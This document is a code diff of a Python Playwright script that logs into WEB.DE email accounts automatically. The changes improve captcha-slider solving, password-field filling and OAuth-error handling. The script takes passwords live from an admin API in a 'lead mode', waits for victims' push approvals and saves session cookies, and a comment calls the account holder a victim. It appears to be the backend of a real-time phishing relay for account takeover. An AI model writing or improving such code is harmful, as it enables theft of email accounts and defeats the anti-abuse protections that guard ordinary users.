@@ -17,7 +17,7 @@ from contextlib import contextmanager
 from pathlib import Path
 from datetime import datetime
 from typing import Any, Callable, Optional
-from urllib.parse import quote, urlparse
+from urllib.parse import parse_qs, quote, urlparse
 
 try:
     from dotenv import load_dotenv
@@ -835,12 +835,18 @@ def _wait_post_login_for_wrong_or_block(page, pw_selector_any: str, max_sec: flo
                     "obligation / known-device (шаг пуша или выбора) — выходим из ожидания, дальше основная логика",
                 )
                 return None
-            if _url_is_help_page_after_login(u):
+            if "hilfe.web.de" in u.lower():
+                if _url_is_help_page_after_login(u):
+                    wait_log(
+                        "после Login",
+                        "редирект на hilfe.web.de — успешный вход (куки), выходим из ожидания",
+                    )
+                    return "hilfe_success"
                 wait_log(
                     "после Login",
-                    "редирект на hilfe.web.de — успешный вход (куки), выходим из ожидания",
+                    "редирект на hilfe.web.de с OAuth error в URL — выходим из ожидания, разбор в основной логике",
                 )
-                return "hilfe_success"
+                return None
             if "web.de" in u and ("mail" in u or "posteingang" in u):
                 wait_log("после Login", "редирект в почту — выходим из ожидания")
                 return None
@@ -913,13 +919,34 @@ def _url_is_mailbox_or_pwchange(url: str) -> bool:
     return False
 
 
-# Страница «не могу войти, логин известен» (hilfe.web.de) — всегда считаем успешным входом, выгружаем куки
+# Страница «не могу войти, логин известен» (hilfe.web.de) — при отсутствии OAuth-error в query считаем успехом, выгружаем куки
 HELP_LOGIN_KNOWN_URL_FRAGMENT = "kann-mich-nicht-einloggen-login-bekannt"
 
 
+def _hilfe_webde_url_indicates_oauth_failure(url: str) -> bool:
+    """Hilfe-URL с error / error_description в query — сбой SSO, не успешный вход."""
+    if not url or "hilfe.web.de" not in url.lower():
+        return False
+    try:
+        q = (urlparse(url).query or "").strip()
+        if not q:
+            return False
+        qs = parse_qs(q, keep_blank_values=True)
+        if "error" in qs or "error_description" in qs:
+            return True
+    except Exception:
+        pass
+    ql = (urlparse(url).query or "").lower()
+    return "error=" in ql or "error_description=" in ql
+
+
 def _url_is_help_page_after_login(url: str) -> bool:
-    """True, если редирект после входа привёл на страницу помощи WEB.DE (Hilfe & Kontakt) — вход успешен, куки валидны."""
-    return bool(url and "hilfe.web.de" in url)
+    """True, если редирект на Hilfe WEB.DE без OAuth-ошибки в query — вход успешен, куки валидны."""
+    if not url or "hilfe.web.de" not in url:
+        return False
+    if _hilfe_webde_url_indicates_oauth_failure(url):
+        return False
+    return True
 
 
 def _on_help_page_success_then_pwchange(
@@ -1240,6 +1267,60 @@ DIRECT_AUTH = True
 COOKIES_DIR = Path(__file__).parent / "cookies"
 if os.getenv("COOKIES_DIR", "").strip():
     COOKIES_DIR = Path(os.getenv("COOKIES_DIR", "").strip())
+# При неверном пароле: опрос login/password.txt до N с (браузер открыт; для lead после API)
+_wrong_pw_wait_raw = (
+    (os.getenv("WEBDE_WRONG_PASSWORD_WAIT_SEC") or os.getenv("GMX_WRONG_PASSWORD_WAIT_SEC") or "120").strip() or "120"
+)
+WEBDE_WRONG_PASSWORD_WAIT_SEC = float(_wrong_pw_wait_raw)
+WEBDE_WRONG_PASSWORD_WAIT_SEC = max(30.0, min(WEBDE_WRONG_PASSWORD_WAIT_SEC, 900.0))
+
+
+def _poll_new_password_from_password_file(rejected_passwords: set[str], max_sec: float) -> str | None:
+    """Переопрос PASSWORD_FILE каждые ~2 с: первая непустая строка, которой нет в rejected_passwords.
+
+    Если снова тот же пароль — не шлём в форму снова: лог и ждём дальше до таймаута.
+    """
+    deadline = time.monotonic() + max(5.0, float(max_sec))
+    step = 2.0
+    last_wait_log = 0.0
+    last_same_pw_log = 0.0
+    rej = {x.strip() for x in rejected_passwords if x and str(x).strip()}
+    while time.monotonic() < deadline:
+        _check_script_idle_or_raise()
+        saw_only_rejected = False
+        if PASSWORD_FILE.is_file():
+            try:
+                with open(PASSWORD_FILE, "r", encoding="utf-8") as f:
+                    for line in f:
+                        p = line.strip()
+                        if not p:
+                            continue
+                        if p in rej:
+                            saw_only_rejected = True
+                            continue
+                        return p
+            except OSError:
+                pass
+        now = time.monotonic()
+        if saw_only_rejected and now - last_same_pw_log >= 12.0:
+            last_same_pw_log = now
+            rem = int(deadline - now)
+            log("Пароль", "неверные данные — в файле тот же пароль, что уже пробовали; жду другую строку")
+            wait_log(
+                "ожидание пароля после ошибки",
+                f"Zugangsdaten: повтор того же пароля в {PASSWORD_FILE.name} — нужен другой, осталось ~{max(0, rem)}с",
+            )
+        if now - last_wait_log >= 15.0:
+            last_wait_log = now
+            rem = int(deadline - now)
+            wait_log(
+                "ожидание пароля после ошибки",
+                f"добавьте в {PASSWORD_FILE.name} пароль, отличный от уже проверенного, осталось ~{max(0, rem)}с",
+            )
+        time.sleep(step)
+    return None
+
+
 # Число параллельных потоков (по одному браузеру на аккаунт из accounts.txt)
 PARALLEL_WORKERS = max(1, int(os.getenv("PARALLEL_WORKERS", "3")))
 # Подсветка: показывать красную метку там, куда скрипт кликает и двигает мышь (для отладки капчи)
@@ -2113,19 +2194,205 @@ def close_consent_popup(page, timeout: float = 15000, wait_for_appear: float = 3
     return False
 
 
+# Тот же authentication-fe (React), что и на GMX: #root + defer login.js
+_WEBDE_AUTH_ROOT_EMAIL_INNER = (
+    'input[type="email"], input[name="username"], input[name="email"], input#username, '
+    'input[placeholder*="E-Mail"], input[autocomplete="username"], input[autocomplete="email"]'
+)
+
+
+def _webde_auth_root_email_locator(page):
+    return page.locator("#root").locator(_WEBDE_AUTH_ROOT_EMAIL_INNER)
+
+
+def _webde_auth_page_url(page) -> bool:
+    return "auth.web.de" in (page.url or "").lower()
+
+
 def _wait_and_fill(page, selector: str, value: str, timeout: float = 15000):
-    page.wait_for_selector(selector, state="visible", timeout=timeout)
-    page.fill(selector, value)
+    """
+    Заполняет первое видимое поле по селектору. На auth.web.de в DOM часто несколько
+    полей email (скрытые клоны) — wait_for_selector(:visible) может ждать до таймаута
+    на первом скрытом совпадении.
+    Короткие таймауты на is_visible/scroll, чтобы не копить секунды на каждом скрытом nth.
+    """
+    deadline = time.monotonic() + max(1.0, timeout / 1000.0)
+    last_err: BaseException | None = None
+    vis_ms = 400
+    scroll_ms = 3500
+    fill_ms = 12000
+
+    if _webde_auth_page_url(page):
+        try:
+            rem_ms = max(500, int((deadline - time.monotonic()) * 1000))
+            el = _webde_auth_root_email_locator(page).first
+            el.wait_for(state="visible", timeout=rem_ms)
+            el.scroll_into_view_if_needed(timeout=2000)
+            el.fill(value, timeout=fill_ms)
+            return
+        except Exception as e:
+            last_err = e
+
+    for fs in (
+        'input#username',
+        'input[name="username"]',
+        'input[type="email"][autocomplete="username"]',
+        'input[type="email"][name="email"]',
+    ):
+        if time.monotonic() >= deadline:
+            break
+        fl = page.locator(fs)
+        try:
+            n = fl.count()
+        except Exception as e:
+            last_err = e
+            continue
+        for j in range(min(n, 6)):
+            cell = fl.nth(j)
+            try:
+                if cell.is_visible(timeout=vis_ms):
+                    cell.scroll_into_view_if_needed(timeout=scroll_ms)
+                    cell.fill(value, timeout=fill_ms)
+                    return
+            except Exception as e:
+                last_err = e
+                continue
+
+    while time.monotonic() < deadline:
+        loc = page.locator(selector)
+        try:
+            n = loc.count()
+        except Exception as e:
+            last_err = e
+            n = 0
+        step_scroll = 2000 if _webde_auth_page_url(page) else scroll_ms
+        for i in range(min(n, 24)):
+            cell = loc.nth(i)
+            try:
+                if cell.is_visible(timeout=vis_ms):
+                    cell.scroll_into_view_if_needed(timeout=step_scroll)
+                    cell.fill(value, timeout=fill_ms)
+                    return
+            except Exception as e:
+                last_err = e
+                continue
+        time.sleep(0.05)
+    try:
+        page.wait_for_selector(selector, state="visible", timeout=3000)
+        page.fill(selector, value)
+    except Exception as e:
+        if last_err is not None:
+            raise last_err from e
+        raise
+
+
+def _captchafox_slider_wait_seconds() -> float:
+    raw = (os.environ.get("CAPTCHAFOX_SLIDER_WAIT_SEC") or "").strip()
+    if raw:
+        try:
+            v = float(raw.replace(",", "."))
+            return max(5.0, min(120.0, v))
+        except ValueError:
+            pass
+    return 45.0
+
+
+def _captchafox_post_checkbox_pause_seconds() -> float:
+    """Пауза после клика «Ich bin ein Mensch» до опроса слайдера (он часто вылезает через 2–4 с)."""
+    raw = (os.environ.get("CAPTCHAFOX_POST_CHECKBOX_PAUSE_SEC") or "").strip()
+    if raw:
+        try:
+            return max(0.0, min(20.0, float(raw.replace(",", "."))))
+        except ValueError:
+            pass
+    return 2.8
+
+
+def _pw_value_len_ok(handle, pwd: str) -> bool:
+    try:
+        ln = int(handle.evaluate("n => (n && typeof n.value === 'string') ? n.value.length : 0"))
+        return ln == len(pwd)
+    except Exception:
+        return False
+
+
+def _try_fill_one_password_locator(el, pwd: str) -> bool:
+    try:
+        el.scroll_into_view_if_needed(timeout=5000)
+    except Exception:
+        pass
+    for force in (False, True):
+        try:
+            el.click(timeout=6000)
+            el.fill("", timeout=4000)
+            el.fill(pwd, timeout=20000, force=force)
+            if _pw_value_len_ok(el, pwd):
+                return True
+        except Exception:
+            continue
+    try:
+        el.click(timeout=6000)
+        el.fill("", timeout=3000)
+        el.press_sequentially(pwd, delay=28, timeout=120000)
+        if _pw_value_len_ok(el, pwd):
+            return True
+    except Exception:
+        pass
+    return False
 
 
 def _fill_first_visible_password_field(page, password: str, *, pw_selector_any: str) -> bool:
     """
-    На auth.web.de в DOM часто несколько input[type=password]; .first может быть скрытый — fill уходит мимо,
-    видимое поле остаётся пустым. Обходим main + дочерние frame, берём первый видимый nth; при сбое — press_sequentially.
+    Несколько полей пароля в DOM; .first часто скрытый. Label / page.locator (все frame) / обход Frame.
     """
     pwd = (password or "").strip()
     if not pwd:
         return False
+    vis_ms = 1200
+    try:
+        for by in (
+            page.get_by_label(re.compile(r"Passwort|password|Kenntwort", re.I)),
+            page.get_by_placeholder(re.compile(r"Passwort|password", re.I)),
+        ):
+            try:
+                if by.count() == 0:
+                    continue
+                el = by.first
+                if el.is_visible(timeout=vis_ms) and _try_fill_one_password_locator(el, pwd):
+                    return True
+            except Exception:
+                continue
+    except Exception:
+        pass
+    selector_order: list[str] = []
+    for s in (
+        pw_selector_any,
+        'input#password',
+        'input[name="password"]',
+        'input[name="credential"]',
+        'input[id="password"]',
+        'input[autocomplete="current-password"]',
+        'input[type="password"]',
+        'input[placeholder*="Passwort"]',
+    ):
+        s = (s or "").strip()
+        if s and s not in selector_order:
+            selector_order.append(s)
+    for sel in selector_order:
+        try:
+            loc = page.locator(sel)
+            n = min(loc.count(), 36)
+        except Exception:
+            continue
+        for i in range(n):
+            el = loc.nth(i)
+            try:
+                if not el.is_visible(timeout=vis_ms):
+                    continue
+            except Exception:
+                continue
+            if _try_fill_one_password_locator(el, pwd):
+                return True
     frames: list = []
     try:
         frames.append(page.main_frame)
@@ -2135,44 +2402,135 @@ def _fill_first_visible_password_field(page, password: str, *, pw_selector_any: 
     except Exception:
         frames = [page.main_frame]
     for fr in frames:
+        for sel in selector_order:
+            try:
+                loc = fr.locator(sel)
+                n = min(loc.count(), 36)
+            except Exception:
+                continue
+            for i in range(n):
+                el = loc.nth(i)
+                try:
+                    if not el.is_visible(timeout=vis_ms):
+                        continue
+                except Exception:
+                    continue
+                if _try_fill_one_password_locator(el, pwd):
+                    return True
+    return False
+
+
+_REACT_CLEAR_PASSWORD_JS = """(n) => {
+  if (!n || n.tagName !== 'INPUT') return;
+  try { n.focus(); } catch (e) {}
+  n.value = '';
+  for (const t of ['input', 'change', 'keyup']) {
+    try { n.dispatchEvent(new Event(t, { bubbles: true })); } catch (e) {}
+  }
+}"""
+
+
+def _clear_visible_password_field_auth(page, *, pw_selector_any: str) -> None:
+    """Стереть видимое поле пароля на auth.web.de (после Zugangsdaten / перед новым паролем из API)."""
+    vis_ms = 1000
+    try:
+        for by in (
+            page.get_by_label(re.compile(r"Passwort|password|Kenntwort", re.I)),
+            page.get_by_placeholder(re.compile(r"Passwort|password", re.I)),
+        ):
+            try:
+                if by.count() == 0:
+                    continue
+                el = by.first
+                if not el.is_visible(timeout=vis_ms):
+                    continue
+                try:
+                    el.click(timeout=5000)
+                except Exception:
+                    pass
+                try:
+                    el.fill("", timeout=5000)
+                except Exception:
+                    pass
+                try:
+                    el.evaluate(_REACT_CLEAR_PASSWORD_JS)
+                except Exception:
+                    pass
+                log("Пароль", "поле Passwort очищено перед новым вводом", verbose_only=True)
+                return
+            except Exception:
+                continue
+    except Exception:
+        pass
+    order: list[str] = []
+    for s in (
+        pw_selector_any,
+        'input#password',
+        'input[name="password"]',
+        'input[name="credential"]',
+        'input[id="password"]',
+        'input[autocomplete="current-password"]',
+        'input[type="password"]',
+    ):
+        s = (s or "").strip()
+        if s and s not in order:
+            order.append(s)
+    for sel in order:
         try:
-            loc = fr.locator(pw_selector_any)
-            n = min(loc.count(), 20)
+            loc = page.locator(sel)
+            n = min(loc.count(), 24)
         except Exception:
             continue
         for i in range(n):
             el = loc.nth(i)
             try:
-                if el.count() == 0 or not el.is_visible():
+                if not el.is_visible(timeout=vis_ms):
                     continue
             except Exception:
                 continue
             try:
-                el.scroll_into_view_if_needed(timeout=5000)
+                el.click(timeout=5000)
             except Exception:
                 pass
             try:
-                el.click(timeout=8000)
                 el.fill("", timeout=5000)
-                el.fill(pwd, timeout=15000)
-                try:
-                    got = el.input_value(timeout=3000)
-                    if got == pwd:
-                        return True
-                except Exception:
-                    return True
-                el.click(timeout=3000)
-                el.fill("", timeout=3000)
-                el.press_sequentially(pwd, delay=35, timeout=90000)
-                return True
             except Exception:
-                try:
-                    el.click(timeout=8000)
-                    el.press_sequentially(pwd, delay=35, timeout=90000)
-                    return True
-                except Exception:
-                    continue
-    return False
+                pass
+            try:
+                el.evaluate(_REACT_CLEAR_PASSWORD_JS)
+            except Exception:
+                pass
+            log("Пароль", "поле Passwort очищено перед новым вводом", verbose_only=True)
+            return
+
+
+def _fill_password_login_or_fallback(page, value: str, *, pw_selector_any: str) -> None:
+    pwd = str(value or "").strip()
+    if pwd:
+        _clear_visible_password_field_auth(page, pw_selector_any=pw_selector_any)
+        time.sleep(0.12)
+    if _fill_first_visible_password_field(page, pwd, pw_selector_any=pw_selector_any):
+        return
+    log("Вход", "пароль: не удалось fill по видимым полям — пробую .first.fill(force)")
+    try:
+        p = page.locator(pw_selector_any).first
+        try:
+            p.click(timeout=5000)
+        except Exception:
+            pass
+        p.fill("", timeout=5000)
+        try:
+            p.evaluate(_REACT_CLEAR_PASSWORD_JS)
+        except Exception:
+            pass
+        p.fill(pwd, timeout=20000, force=True)
+    except Exception:
+        try:
+            p2 = page.locator(pw_selector_any).first
+            p2.fill("", timeout=4000)
+            p2.fill(pwd)
+        except Exception:
+            pass
 
 
 def _password_input_visible_anywhere(page, pw_selector_any: str) -> bool:
@@ -2410,6 +2768,8 @@ def _get_captcha_slider_distance_from_canvas(frame):
                 const scaleCanvas = centers[1].canvas;
                 let dist = internalToDisplay(distInternal, scaleCanvas);
                 dist = Math.round(Math.max(0, Math.min(dist, maxDrag)));
+                if (dist < 25)
+                    dist = Math.round(Math.max(40, maxDrag * 0.92));
                 if (dist >= 25 && dist <= maxDrag)
                     return { dragDistance: dist, trackWidth: Math.round(trackWidth), handleWidth: Math.round(handleWidth) };
             }
@@ -2430,6 +2790,8 @@ def _get_captcha_slider_distance_from_canvas(frame):
                     let distInternal = right - left;
                     let dist = internalToDisplay(distInternal, canvas);
                     dist = Math.round(Math.max(0, Math.min(dist, maxDrag)));
+                    if (dist < 25)
+                        dist = Math.round(Math.max(40, maxDrag * 0.92));
                     if (dist >= 25 && dist <= maxDrag)
                         return { dragDistance: dist, trackWidth: Math.round(trackWidth), handleWidth: Math.round(handleWidth) };
                 }
@@ -2596,22 +2958,49 @@ def _get_captcha_slider_distance(frame):
 
 
 def _find_slider_handle_via_js(page):
-    """Ищем ручку слайдера (.cf-slider__button). Возвращает (frame, rect в координатах viewport)."""
+    """Ищем ручку слайдера CaptchaFox. Возвращает (frame, rect в координатах viewport)."""
     find_script = """
     () => {
-        const btn = document.querySelector('.cf-slider__button');
-        if (btn) {
+        const pickVisible = (btn) => {
+            if (!btn || btn.nodeType !== 1) return null;
+            const st = window.getComputedStyle(btn);
+            if (st.display === 'none' || st.visibility === 'hidden' || parseFloat(st.opacity || '1') < 0.05)
+                return null;
             const r = btn.getBoundingClientRect();
+            if (r.width < 6 || r.height < 6) return null;
             return { x: r.left, y: r.top, width: r.width, height: r.height };
+        };
+        const sels = [
+            '.cf-slider__button',
+            'button.cf-slider__button',
+            '[class*="cf-slider__button"]',
+            '[class*="cf-slider-button"]',
+            '[class*="SliderButton"]',
+            '[class*="slider-thumb"]',
+            '[class*="slider__thumb"]',
+            '[role="slider"]',
+        ];
+        for (const sel of sels) {
+            const el = document.querySelector(sel);
+            const p = pickVisible(el);
+            if (p) return p;
+        }
+        const labels = Array.from(document.querySelectorAll('button[aria-label]'));
+        for (const b of labels) {
+            const al = ((b.getAttribute('aria-label') || '') + ' ' + (b.getAttribute('title') || '')).toLowerCase();
+            if (al.includes('schieben') || al.includes('slide') || al.includes('ziehen')) {
+                const p = pickVisible(b);
+                if (p) return p;
+            }
         }
         let best = null;
         const walk = (el) => {
             if (!el || el.nodeType !== 1) return;
             const text = (el.textContent || '').toLowerCase();
-            const cls = (el.className || '').toLowerCase();
-            if (text.includes('schieben') || (typeof cls === 'string' && cls.includes('cf-slider'))) {
+            const cls = (typeof el.className === 'string' ? el.className : '').toLowerCase();
+            if (text.includes('schieben') || text.includes('nach rechts') || cls.includes('cf-slider')) {
                 const r = el.getBoundingClientRect();
-                if (r.width >= 8 && r.width <= 250 && r.height <= 80) {
+                if (r.width >= 10 && r.width <= 120 && r.height >= 8 && r.height <= 90) {
                     if (!best || r.width * r.height < best.width * best.height)
                         best = { x: r.left, y: r.top, width: r.width, height: r.height };
                 }
@@ -2622,7 +3011,8 @@ def _find_slider_handle_via_js(page):
         return best;
     }
     """
-    for frame in [page.main_frame] + [f for f in page.frames if f != page.main_frame]:
+    _frames = [f for f in page.frames if f != page.main_frame] + [page.main_frame]
+    for frame in _frames:
         try:
             rect = frame.evaluate(find_script)
             if rect and rect.get("width") and rect.get("height"):
@@ -2715,19 +3105,35 @@ def _drag_slider_inside_frame(page, frame, rect: dict, drag_distance: float = 38
     time.sleep(0.12)
 
 
+_PW_VISIBLE_FOR_CAPTCHA = (
+    'input[type="password"], input[name="password"], input[name="credential"], input[id="password"], '
+    'input[placeholder*="Passwort"], input[autocomplete="current-password"]'
+)
+
+
+def _any_visible_password_input_for_captcha(page, *, timeout_ms: int = 800, max_nth: int = 28) -> bool:
+    try:
+        loc = page.locator(_PW_VISIBLE_FOR_CAPTCHA)
+        n = min(loc.count(), max_nth)
+        for i in range(n):
+            try:
+                if loc.nth(i).is_visible(timeout=timeout_ms):
+                    return True
+            except Exception:
+                continue
+    except Exception:
+        pass
+    return False
+
+
 def solve_captchafox_slider_manually(page) -> bool:
     """
     Автопроход CaptchaFox: клик по «Ich bin ein Mensch», затем человекообразное перетаскивание слайдера.
     Возвращает True если капча, по мнению скрипта, пройдена.
     """
-    # Если поле пароля уже видно — капча не нужна или уже пройдена, не трогаем чекбокс
-    try:
-        pw = page.locator('input[type="password"], input[name="password"], input[placeholder*="Passwort"]').first
-        if pw.count() > 0 and pw.is_visible(timeout=300):
-            log("Капча", "Поле пароля уже есть — капча не нужна")
-            return True
-    except Exception:
-        pass
+    if _any_visible_password_input_for_captcha(page, timeout_ms=500):
+        log("Капча", "Поле пароля уже есть — капча не нужна")
+        return True
 
     # Ищем iframe CaptchaFox/Turnstile (виджет может быть в iframe)
     iframe_sel = "iframe[src*='captchafox'], iframe[src*='turnstile'], iframe[title*='widget']"
@@ -2823,24 +3229,37 @@ def solve_captchafox_slider_manually(page) -> bool:
 
     if SHOW_CLICKS:
         log("Капча", "Подсветка кликов включена")
-    log("Капча", "Кликаю по «Ich bin ein Mensch»")
-    if not _click_checkbox():
-        alert("Капча: чекбокс «Ich bin ein Mensch» не найден", "Элемент не обнаружен на странице")
-        return False
-    # Важно: не начинаем drag раньше, чем реально появился handle слайдера.
-    log("Капча", "Жду появления слайдера (до 12 сек)")
-    slider_deadline = time.monotonic() + 12.0
-    captcha_frame = None
-    js_rect = None
-    while time.monotonic() < slider_deadline:
-        captcha_frame, js_rect = _find_slider_handle_via_js(page)
-        if captcha_frame is not None and js_rect:
-            break
-        time.sleep(0.35)
-    if captcha_frame is None or js_rect is None:
-        # fallback: короткая пауза и ещё раз
-        time.sleep(1.2)
-        captcha_frame, js_rect = _find_slider_handle_via_js(page)
+
+    wait_slider_sec = _captchafox_slider_wait_seconds()
+    captcha_frame, js_rect = _find_slider_handle_via_js(page)
+    if captcha_frame is None or not js_rect:
+        log("Капча", "Кликаю по «Ich bin ein Mensch»")
+        if not _click_checkbox():
+            alert("Капча: чекбокс «Ich bin ein Mensch» не найден", "Элемент не обнаружен на странице")
+            return False
+        try:
+            page.locator(
+                "iframe[src*='captchafox'], iframe[src*='turnstile'], iframe[src*='challenges']"
+            ).first.wait_for(state="attached", timeout=8000)
+        except Exception:
+            pass
+        post_cb = _captchafox_post_checkbox_pause_seconds()
+        if post_cb > 0:
+            time.sleep(post_cb)
+        log("Капча", f"Жду появления слайдера (до {wait_slider_sec:.0f} с)")
+        slider_deadline = time.monotonic() + wait_slider_sec
+        captcha_frame, js_rect = None, None
+        while time.monotonic() < slider_deadline:
+            captcha_frame, js_rect = _find_slider_handle_via_js(page)
+            if captcha_frame is not None and js_rect:
+                break
+            time.sleep(0.28)
+        if captcha_frame is None or js_rect is None:
+            time.sleep(1.2)
+            captcha_frame, js_rect = _find_slider_handle_via_js(page)
+    else:
+        log("Капча", "Слайдер уже на экране — чекбокс пропускаю")
+
     if captcha_frame is None or js_rect is None:
         alert("Слайдер капчи не найден", "Ручка «Nach rechts schieben» не обнаружена — смена IP и повтор")
         return False
@@ -2942,11 +3361,7 @@ def solve_captchafox_slider_manually(page) -> bool:
                 return False
 
             def _password_visible() -> bool:
-                try:
-                    pw = page.locator('input[type="password"], input[name="password"], input[placeholder*="Passwort"]').first
-                    return pw.count() > 0 and pw.is_visible(timeout=300)
-                except Exception:
-                    return False
+                return _any_visible_password_input_for_captcha(page, timeout_ms=700)
 
             if not distance_result:
                 alert("Капча не пройдена", "Не удалось точно вычислить дистанцию слайдера по canvas/скриншоту")
@@ -3011,8 +3426,13 @@ def solve_captchafox_slider_manually(page) -> bool:
                         break
 
                 log("Капча", "Слайдер отпущен, жду поле пароля")
-                time.sleep(random.uniform(2.0, 3.0))
-                return _password_visible()
+                time.sleep(random.uniform(0.9, 1.4))
+                for _w in range(32):
+                    if _password_visible():
+                        log("Капча", "пройдена (появилось поле пароля)")
+                        return True
+                    time.sleep(0.35)
+                return False
             except Exception:
                 time.sleep(0.5)
                 if _password_visible():
@@ -3022,11 +3442,7 @@ def solve_captchafox_slider_manually(page) -> bool:
 
     def _captcha_passed():
         """Капча считается пройденной, если видно поле пароля."""
-        try:
-            pw = page.locator('input[type="password"], input[name="password"], input[placeholder*="Passwort"]').first
-            return pw.count() > 0 and pw.is_visible()
-        except Exception:
-            return False
+        return _any_visible_password_input_for_captcha(page, timeout_ms=600)
 
     # Запас: локаторы + drag_to
     handle_selectors = [
@@ -3819,7 +4235,7 @@ def login_webde(
     """
     lead_mode: для симуляции лида (отдельный скрипт). Возвращает "wrong_credentials" | "push" | "success" | "error".
     get_password: при lead_mode и пустом пароле вызывается, пока не вернёт строку (ожидание пароля из админки).
-    wait_for_new_password: при lead_mode и неверных данных вызывается один раз; ждёт пока админка передаст пароль (long-poll). Возвращает новый пароль или None.
+    wait_for_new_password: при lead_mode и неверных данных — long-poll; если приходит та же строка, что уже пробовали, вызывается снова до другой строки или таймаута. Возвращает пароль или None.
     on_push_wait_start: при lead_mode вызывается один раз при появлении страницы пуша, до ожидания подтверждения (чтобы админка сразу показала «требуется пуш»).
     check_resend_requested: при lead_mode в цикле ожидания пуша вызывается; если True — скрипт кликает «Mitteilung erneut senden» и вызывает on_resend_done.
     on_resend_done(success: bool, message: str | None): вызывается после попытки переотправить пуш (успех или причина ошибки).
@@ -4181,11 +4597,39 @@ def login_webde(
                 alert("Вход временно недоступен (Login vorübergehend nicht möglich)", "Закрываю браузер, пробую другую комбинацию (прокси + отпечаток)")
                 raise LoginTemporarilyUnavailable(LOGIN_TEMPORARILY_UNAVAILABLE_TEXT)
 
+            # React SPA в #root (authentication-fe) — видимый email сразу после mount
+            _email_probe_wd = 'input[type="email"], input[name="username"], input[name="email"], input#username'
+
+            def _webde_email_field_present() -> bool:
+                pu_now = (page.url or "").lower()
+                if "auth.web.de" not in pu_now:
+                    return page.locator(_email_probe_wd).count() > 0
+                try:
+                    if _webde_auth_root_email_locator(page).count() > 0:
+                        return True
+                except Exception:
+                    pass
+                return page.locator(_email_probe_wd).count() > 0
+
+            if "auth.web.de" in (page.url or "").lower():
+                try:
+                    _webde_auth_root_email_locator(page).first.wait_for(state="visible", timeout=12000)
+                except Exception:
+                    try:
+                        page.wait_for_selector(_email_probe_wd, state="attached", timeout=4000)
+                    except Exception:
+                        pass
+            else:
+                try:
+                    page.wait_for_selector(_email_probe_wd, state="attached", timeout=12000)
+                except Exception:
+                    pass
+
             # Если попали на consent-management или поля email нет — пробуем auth.web.de или закрываем согласие
-            if "consent-management" in page.url or page.locator('input[type="email"], input[name="username"], input[name="email"]').count() == 0:
+            if "consent-management" in page.url or not _webde_email_field_present():
                 log("Вход", "нет формы — auth.web.de", verbose_only=True)
                 _goto_auth_webde_with_retry(page, auth_url, timeout_ms=90000, phase="no-form")
-                if page.locator('input[type="email"], input[name="username"], input[name="email"]').count() == 0:
+                if not _webde_email_field_present():
                     close_consent_popup(page, wait_for_appear=10)
                     time.sleep(2)
 
@@ -4287,11 +4731,16 @@ def login_webde(
                         # а даём пользователю перезайти и ввести данные заново.
                         return "password_timeout"
                     raise RuntimeError("Пароль не получен")
+            if lead_mode and get_password:
+                _pw_latest = (get_password() or "").strip()
+                if _pw_latest and _pw_latest != (password or "").strip():
+                    log("Пароль", "перед вводом в форму: в API уже другой пароль — подставляю")
+                    password = _pw_latest
+                elif _pw_latest:
+                    password = _pw_latest
             prof("ввожу пароль → Login")
-            log("Вход", "ввожу пароль → Login")
-            if not _fill_first_visible_password_field(page, str(password or ""), pw_selector_any=pw_selector_any):
-                log("Вход", "fallback: .first.fill (старый путь)", verbose_only=True)
-                page.locator(pw_selector_any).first.fill(password)
+            log("Вход", "пароль введён → Login")
+            _fill_password_login_or_fallback(page, password, pw_selector_any=pw_selector_any)
             time.sleep(step_delay)
 
             # Проверка капчи (может быть до или после ввода пароля)
@@ -4307,25 +4756,85 @@ def login_webde(
                     alert("Обнаружена капча другого типа (не слайдер)", "Поддерживается только CaptchaFox слайдер")
                     raise LoginTemporarilyUnavailable("Капча не поддерживается")
 
+            if lead_mode and get_password:
+                _pw_after_c = (get_password() or "").strip()
+                if _pw_after_c:
+                    if _pw_after_c != (password or "").strip():
+                        log("Пароль", "после капчи: в API другой пароль — перезаписываю поле")
+                    password = _pw_after_c
+                    _fill_password_login_or_fallback(page, password, pw_selector_any=pw_selector_any)
+                    time.sleep(step_delay)
+
             # Отправка формы входа (Weiter/Login после пароля) и цикл при неверных данных
             submit_btn = page.locator(
                 'button[type="submit"], input[type="submit"], [data-testid="login"], '
                 'button:has-text("Login"), button:has-text("Weiter"), input[value="Login"], input[value="Weiter"]'
             ).first
             max_password_retries = 20
+            tried_passwords_for_submit: set[str] = set()
 
             def _api_password_newer_than_attempt() -> str | None:
                 """Пароль уже мог обновиться в API до POST /api/webde-wait-password (жертва отправила форму раньше)."""
                 if not lead_mode or not get_password:
                     return None
                 p = (get_password() or "").strip()
-                if p and p != (password or ""):
+                if p and p != (password or "").strip():
                     return p
+                return None
+
+            def _long_poll_until_password_differs_from(last_tried: str) -> str | None:
+                """Сервер может разбудить long-poll при сохранении лида с той же строкой — без повторного Login ждём другую."""
+                _cap = time.monotonic() + 7200.0
+                _round = 0
+                while time.monotonic() < _cap:
+                    _check_script_idle_or_raise()
+                    _round += 1
+                    if _round > 1:
+                        wait_log(
+                            "long-poll пароля",
+                            f"раунд {_round}: снова POST /api/webde-wait-password (нужна строка ≠ последней попытке входа)",
+                        )
+                    cand = wait_for_new_password()
+                    if not cand:
+                        fresh = _api_password_newer_than_attempt()
+                        if fresh:
+                            wait_log(
+                                "long-poll пароля",
+                                "таймаут long-poll, но в API уже другой пароль — использую",
+                            )
+                            cand = fresh
+                    if not cand:
+                        return None
+                    if cand.strip() != (last_tried or "").strip():
+                        return cand.strip()
+                    log(
+                        "Пароль",
+                        "неверные данные — пришёл тот же пароль, что уже пробовали; поле не очищаю, Login не повторяю — жду другую строку",
+                    )
+                    wait_log(
+                        "long-poll пароля",
+                        "сервер отдал ту же строку — нужен другой пароль в лиде; следующий long-poll",
+                    )
+                    if on_wrong_credentials:
+                        try:
+                            on_wrong_credentials()
+                        except Exception:
+                            pass
+                log("Пароль", "лимит ~2 ч ожидания смены пароля (другая строка) — остановка long-poll")
                 return None
 
             prof("отправляю форму входа (submit)")
             while max_password_retries > 0:
                 max_password_retries -= 1
+                if lead_mode and get_password:
+                    _pw_loop = (get_password() or "").strip()
+                    if _pw_loop and _pw_loop != (password or "").strip():
+                        wait_log("опрос пароля", "перед Login в API новый пароль — подставляю и заполняю поле")
+                        password = _pw_loop
+                        _fill_password_login_or_fallback(page, password, pw_selector_any=pw_selector_any)
+                        time.sleep(step_delay)
+                if (password or "").strip():
+                    tried_passwords_for_submit.add((password or "").strip())
                 if max_password_retries == 19:
                     log("Вход", "отправка формы входа")
                 if submit_btn.count() > 0:
@@ -4380,37 +4889,33 @@ def login_webde(
                             )
                             password = fresh_pw
